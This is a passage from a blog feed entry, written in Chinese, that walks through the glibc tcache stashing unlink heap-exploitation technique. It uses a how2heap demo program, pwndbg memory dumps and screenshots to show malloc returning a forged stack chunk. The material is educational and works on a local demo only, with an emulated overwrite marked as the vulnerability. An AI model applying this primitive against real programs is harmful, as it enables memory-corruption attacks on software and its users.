class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">300</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> <span class="meta">#tcache</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000000a1</span> #chunk_lis[<span class="number">0</span>](<span class="built_in">free</span>-unsortedbin)</span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557572f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000000a1</span> #chunk_lis[<span class="number">1</span>](<span class="built_in">free</span>-tcachebin)</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757390</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000000a1</span> #chunk_lis[<span class="number">2</span>](<span class="built_in">free</span>-unsortedbin)</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757430</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000000a1</span> #chunk_lis[<span class="number">3</span>](<span class="built_in">free</span>-tcachebin)</span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557574d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000000a1</span> #chunk_lis[<span class="number">4</span>](<span class="built_in">free</span>-tcachebin)</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757570</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000000a1</span> #chunk_lis[<span class="number">5</span>](<span class="built_in">free</span>-tcachebin)</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757610</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000000a1</span> #chunk_lis[<span class="number">6</span>](<span class="built_in">free</span>-tcachebin)</span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557576b0</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000000a1</span> #chunk_lis[<span class="number">7</span>](<span class="built_in">free</span>-tcachebin)</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757750</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000000a1</span> #chunk_lis[<span class="number">8</span>](<span class="built_in">free</span>-tcachebin)</span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557577f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000020811</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757950</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1621219960867-83dd9d04-80b3-44cf-bfb2-676ab41b7948.png#align=left&display=inline&height=666&id=u1ac491bd&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-17%2010.52.36.png&originHeight=666&originWidth=2748&size=95300&status=done&style=none&width=2748" alt="截屏2021-05-17 10.52.36.png"></p><blockquote><p>注意：这里的 free 顺序可不是乱来的：<br>Q：为什么要先释放后 6 个堆块让其进入 tcachebin？<br>A：这样考虑的原因是在之后释放 3 个堆块时可以让其进入 unsortedbin 中，如果先释放前 6 个堆块那么后续的 3 个堆块的最后一个堆块会与 top_chunk 合并导致攻击失败。<br>Q：为什么要这样释放 free【chunk1】、free【chunk0】、free【chunk2】<br>A：首先让 chunk1 进入 tcachebin，这样的作用是防止后续进入 unsortedbin 的 chunk0、chunk2 发生合并导致攻击失败。</p></blockquote><p>现在我们再申请一个大小为 0xa0 的堆块让其进入 smallbin 中（其实这里 malloc 堆块的大小不是 0x90 就行）（b 54-&gt;c）：</p><blockquote><p>这里不懂的可以去看看 malloc 源码。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//convert into small bin</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1621220247472-2b947e0c-3c42-4a84-a0a0-0dd78aa4c296.png#align=left&display=inline&height=670&id=NcxHC&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-17%2010.57.20.png&originHeight=670&originWidth=2748&size=96529&status=done&style=none&width=2748" alt="截屏2021-05-17 10.57.20.png"><br>如上图所示原来的 unsortedbin 中的 free chunk 已经进入了 smallbin 中，现在我们清空两个 tcachebin 中的 free chunk，为之后的攻击做准备（b 59-&gt;c）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//now 5 tcache bins</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">300</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> <span class="meta">#tcache</span></span><br><span class="line"><span class="number">0x555555757010</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000005</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757090</span>:<span class="number">0x00005555557576c0</span><span class="number">0x0000000000000000</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000000a1</span> #chunk_lis[<span class="number">0</span>](<span class="built_in">free</span>-smallbin)</span><br><span class="line"><span class="number">0x555555757260</span>:<span class="number">0x00007ffff7dcdd30</span><span class="number">0x0000555555757390</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557572f0</span>:<span class="number">0x00000000000000a0</span><span class="number">0x00000000000000a0</span> #chunk_lis[<span class="number">1</span>](<span class="built_in">malloc</span>)</span><br><span class="line"><span class="number">0x555555757300</span>:<span class="number">0x0000555555757760</span><span class="number">0x0000000000000000</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757390</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000000a1</span> #chunk_lis[<span class="number">2</span>](<span class="built_in">free</span>-smallbin)</span><br><span class="line"><span class="number">0x5555557573a0</span>:<span class="number">0x0000555555757250</span><span class="number">0x00007ffff7dcdd30</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757430</span>:<span class="number">0x00000000000000a0</span><span class="number">0x00000000000000a0</span> #chunk_lis[<span class="number">3</span>](<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x555555757440</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000555555757010</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557574d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000000a1</span> #chunk_lis[<span class="number">4</span>](<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x5555557574e0</span>:<span class="number">0x0000555555757440</span><span class="number">0x0000555555757010</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757570</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000000a1</span> #chunk_lis[<span class="number">5</span>](<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x555555757580</span>:<span class="number">0x00005555557574e0</span><span class="number">0x0000555555757010</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757610</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000000a1</span> #chunk_lis[<span class="number">6</span>](<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x555555757620</span>:<span class="number">0x0000555555757580</span><span class="number">0x0000555555757010</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557576b0</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000000a1</span> #chunk_lis[<span class="number">7</span>](<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x5555557576c0</span>:<span class="number">0x0000555555757620</span><span class="number">0x0000555555757010</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757750</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000000a1</span> #chunk_lis[<span class="number">8</span>](<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x555555757760</span>:<span class="number">0x00005555557576c0</span><span class="number">0x0000000000000000</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557577f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000000b1</span> <span class="meta">#chunk(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557578a0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000020761</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757950</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1621220384137-9d9b4a7d-3e6d-45d5-aea0-c238de71e03e.png#align=left&display=inline&height=672&id=u73e97089&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-17%2010.59.39.png&originHeight=672&originWidth=2750&size=96460&status=done&style=none&width=2750" alt="截屏2021-05-17 10.59.39.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">smallbins</span><br><span class="line"><span class="number">0xa0</span>: <span class="number">0x555555757390</span> —▸ <span class="number">0x555555757250</span> —▸ x (main_arena+<span class="number">240</span>) ◂— <span class="number">0x555555757390</span></span><br><span class="line">  #后释放【chunk2】   #先释放【chunk0】</span><br></pre></td></tr></table></figure><p>现在我们开始攻击，假如说现在有 UAF 或者堆溢出漏洞可以修改 chunk_lis[2]的 bk 指针，这里我们将其修改为之前伪造的 stack 地址（b 67-&gt;c）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line"><span class="comment">//change victim-&gt;bck</span></span><br><span class="line"><span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var;</span><br><span class="line"><span class="comment">/*VULNERABILITY*/</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">300</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> <span class="meta">#tcache</span></span><br><span class="line"><span class="number">0x555555757010</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000005</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757090</span>:<span class="number">0x00005555557576c0</span><span class="number">0x0000000000000000</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000000a1</span> #chunk_lis[<span class="number">0</span>](<span class="built_in">free</span>-smallbin)</span><br><span class="line"><span class="number">0x555555757260</span>:<span class="number">0x00007ffff7dcdd30</span><span class="number">0x0000555555757390</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557572f0</span>:<span class="number">0x00000000000000a0</span><span class="number">0x00000000000000a0</span> #chunk_lis[<span class="number">1</span>](<span class="built_in">malloc</span>)</span><br><span class="line"><span class="number">0x555555757300</span>:<span class="number">0x0000555555757760</span><span class="number">0x0000000000000000</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757390</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000000a1</span> #chunk_lis[<span class="number">2</span>](<span class="built_in">free</span>-smallbin)</span><br><span class="line"><span class="number">0x5555557573a0</span>:<span class="number">0x0000555555757250</span><span class="number">0x00007fffffffdcc0</span></span><br><span class="line">       #<span class="number">0x00007ffff7dcdd30</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757430</span>:<span class="number">0x00000000000000a0</span><span class="number">0x00000000000000a0</span> #chunk_lis[<span class="number">3</span>](<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x555555757440</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000555555757010</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557574d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000000a1</span> #chunk_lis[<span class="number">4</span>](<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x5555557574e0</span>:<span class="number">0x0000555555757440</span><span class="number">0x0000555555757010</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757570</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000000a1</span> #chunk_lis[<span class="number">5</span>](<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x555555757580</span>:<span class="number">0x00005555557574e0</span><span class="number">0x0000555555757010</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757610</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000000a1</span> #chunk_lis[<span class="number">6</span>](<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x555555757620</span>:<span class="number">0x0000555555757580</span><span class="number">0x0000555555757010</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557576b0</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000000a1</span> #chunk_lis[<span class="number">7</span>](<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x5555557576c0</span>:<span class="number">0x0000555555757620</span><span class="number">0x0000555555757010</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757750</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000000a1</span> #chunk_lis[<span class="number">8</span>](<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x555555757760</span>:<span class="number">0x00005555557576c0</span><span class="number">0x0000000000000000</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557577f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000000b1</span> <span class="meta">#chunk(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557578a0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000020761</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757950</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1621220778327-e45ed6c2-0b14-4a58-91e0-ab49a5ade87b.png#align=left&display=inline&height=742&id=uc84644af&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-17%2011.06.14.png&originHeight=742&originWidth=2752&size=111653&status=done&style=none&width=2752" alt="截屏2021-05-17 11.06.14.png"><br>如上图所示，虽然在 pwndbg 中 smallbin 的 0xa0 链表发生了 corrupted（异常），但是 glibc malloc 并不会检测到此异常，我们调用 calloc 直接向 smallbin 中申请堆块，这里引入源码进行调试：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//trigger the attack</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br></pre></td></tr></table></figure><p>我们调试到此处：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1621299758456-9e1d331f-55c5-4ed4-b6cd-fb9bf0c1fb28.png#align=left&display=inline&height=1800&id=vWLAy&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-18%2009.02.30.png&originHeight=1800&originWidth=2880&size=559244&status=done&style=none&width=2880" alt="截屏2021-05-18 09.02.30.png"><br>接下来的步骤可以看如下 PPT：</p><blockquote><p><strong>这里一定要注意：smallbin 的分配机制是先入先出（FIFO）</strong></p></blockquote><p>第一次放入：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1621306249880-0331e36d-46db-477a-ab76-3ce1f10cfd90.png#align=left&display=inline&height=744&id=ua2d478cb&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-18%2010.50.45.png&originHeight=744&originWidth=2752&size=103019&status=done&style=none&width=2752" alt="截屏2021-05-18 10.50.45.png"><br>完成后内容如下：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1621220946055-8d1f51aa-43d4-48b2-ba42-414240c951d8.png#align=left&display=inline&height=748&id=ua394b626&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-17%2011.09.02.png&originHeight=748&originWidth=2752&size=103690&status=done&style=none&width=2752" alt="截屏2021-05-17 11.09.02.png"></p><blockquote><p>注意，这里 stack 上的 bk 位可不是乱伪造的，详见 PPT</p></blockquote><p>完成后内存状况如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">300</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> <span class="meta">#tcache</span></span><br><span class="line"><span class="number">0x555555757010</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000007</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757090</span>:<span class="number">0x00007fffffffdcd0</span><span class="number">0x0000000000000000</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000000a1</span> #chunk_lis[<span class="number">0</span>](<span class="built_in">malloc</span>)</span><br><span class="line"><span class="number">0x555555757260</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557572f0</span>:<span class="number">0x00000000000000a0</span><span class="number">0x00000000000000a0</span> #chunk_lis[<span class="number">1</span>](<span class="built_in">malloc</span>)</span><br><span class="line"><span class="number">0x555555757300</span>:<span class="number">0x0000555555757760</span><span class="number">0x0000000000000000</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757390</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000000a1</span> #chunk_lis[<span class="number">2</span>](<span class="built_in">free</span>-smallbin)</span><br><span class="line"><span class="number">0x5555557573a0</span>:<span class="number">0x00005555557576c0</span><span class="number">0x0000555555757010</span> #chunk_lis[<span class="number">2</span>](<span class="built_in">free</span>-tcachebin)</span><br><span class="line">       #<span class="number">0x00007ffff7dcdd30</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757430</span>:<span class="number">0x00000000000000a0</span><span class="number">0x00000000000000a0</span> #chunk_lis[<span class="number">3</span>](<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x555555757440</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000555555757010</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557574d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000000a1</span> #chunk_lis[<span class="number">4</span>](<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x5555557574e0</span>:<span class="number">0x0000555555757440</span><span class="number">0x0000555555757010</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757570</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000000a1</span> #chunk_lis[<span class="number">5</span>](<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x555555757580</span>:<span class="number">0x00005555557574e0</span><span class="number">0x0000555555757010</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757610</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000000a1</span> #chunk_lis[<span class="number">6</span>](<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x555555757620</span>:<span class="number">0x0000555555757580</span><span class="number">0x0000555555757010</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557576b0</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000000a1</span> #chunk_lis[<span class="number">7</span>](<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x5555557576c0</span>:<span class="number">0x0000555555757620</span><span class="number">0x0000555555757010</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757750</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000000a1</span> #chunk_lis[<span class="number">8</span>](<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x555555757760</span>:<span class="number">0x00005555557576c0</span><span class="number">0x0000000000000000</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557577f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000000b1</span> <span class="meta">#chunk(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557578a0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000020761</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757950</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">16</span>gx stack_var</span><br><span class="line"><span class="number">0x7fffffffdcc0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdcd0</span>:<span class="number">0x00005555557573a0</span><span class="number">0x0000555555757010</span></span><br><span class="line"><span class="number">0x7fffffffdce0</span>:<span class="number">0x00007ffff7dcdd30</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdcf0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdd00</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdd10</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdd20</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdd30</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>注意现在的 stack_var 和堆块 0x555555757390、0x5555557576c0 都有两个 bin：smallbin 和 tcachebin。<br>现在再次申请一次即可控制 stack 上的地址（b 79-&gt;c）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">2</span>],(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line"></span><br><span class="line">assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1621220991490-5473d6b8-8aba-410e-97d3-13e444bb7569.png#align=left&display=inline&height=746&id=u725c06df&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-17%2011.09.46.png&originHeight=746&originWidth=2752&size=102060&status=done&style=none&width=2752" alt="截屏2021-05-17 11.09.46.png"><br>另外，申请之后不可再次 calloc 申请，因为在整理 smallbin 堆块到 tcachebin 时会发生内存访问错误：0x0</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>tcache_stashing_unlink_attack 和 house of lore 都是对 smallbin 的缺陷发生攻击，即在对 smallbin 中的 free chunk 进行解链时只对前两个堆块之间的双向链表完整性进行检查而不对之后的堆块进行检查，通过这一点可以控制任意地址。另外 tcache_stashing_unlink_attack 和 house of lore 略有不同，可以将本篇文章和上一篇进行对比，tcache_stashing_unlink_attack 要求的条件比较少，但是需要 calloc 跳过 tcachebin 申请。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>how2heap(12)-house of lore</title>
    <link href="https://cyberangel.cn/2021/05/14/how2heap(12)-house%20of%20lore/"/>
    <id>https://cyberangel.cn/2021/05/14/how2heap(12)-house%20of%20lore/</id>
    <published>2021-05-14T08:02:54.000Z</published>
    <updated>2021-07-04T09:57:11.822Z</updated>
    
